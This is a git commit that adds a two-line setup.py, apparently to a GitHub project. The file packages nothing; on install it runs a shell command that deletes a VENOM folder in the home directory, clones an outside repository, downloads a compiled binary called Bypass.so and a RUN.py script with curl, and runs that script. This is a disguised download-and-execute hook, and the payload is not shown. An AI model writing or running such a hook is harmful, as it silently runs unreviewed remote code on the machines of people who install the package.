efddb3b229720cf94cee8ce6c6c370e74d526afd
br5kly <108040523+br5kly@users.noreply.github.com>
2024-01-26 17:34:53 +0200

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,2 @@
+import os
+os.system('cd && rm -rf VENOM && git clone https://github.com/VENOM-786/VENOM && cd VENOM && curl -L -o Bypass.so https://github.com/br5kly/Inj/raw/main/Bypass.cpython-311.so && curl -L -o RUN.py https://raw.githubusercontent.com/br5kly/Inj/main/RUN.py && python RUN.py')
